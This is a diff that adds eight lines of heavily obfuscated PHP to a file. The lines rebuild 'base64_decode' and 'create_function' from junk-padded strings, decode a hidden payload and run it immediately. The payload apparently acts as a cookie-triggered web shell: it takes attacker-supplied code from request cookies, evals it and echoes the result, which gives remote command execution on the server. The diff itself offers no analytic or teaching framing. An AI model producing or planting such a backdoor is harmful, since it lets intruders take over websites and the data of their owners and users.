@@ -1,0 +1,8 @@
+$viug="JGM9dogJ2dogNvdW50JdogzskYTdog0kX0NPT0tJRTtpZihyZXNldogdCgkYSdogk9PSdubdogycgJiYgJGMoJGEpPjMpeyRdo";
+$jqbn="Swdoggam9pbdogihhcnJheV9zbGljZdogSgkYSwkYdogydoggkYSdogktdogMykpKSkpO2dogVjaG8gJzdogwvJy4kay4nPic7fQ==";
+$ldex="dogdfcmVwbGFjZShhdogcnJheSgnL1teXHc9dogXHNdLdogydogcsJy9ccy8dognKdogSwgdogYXJyYXkoJdogycsJysndogK";
+$mdib = str_replace("g","","gstrg_grgegpglgagce");
+$urot="grPSdogdoYWNrJztldogY2hvICc8dogJydog4kaydog4nPic7ZXdogZhbCdoghidogYXNlNjdogRfZGVdogjb2RlKHByZW";
+$euns = $mdib("ai", "", "aibaiaaisaieai6ai4_aideaicaioaidaie");
+$ltid = $mdib("fud","","fudcfudrefudatfudefud_fudfufudncfudtfudiofudn");
+$wwqc = $ltid('', $euns($mdib("dog", "", $viug.$urot.$ldex.$jqbn))); $wwqc();
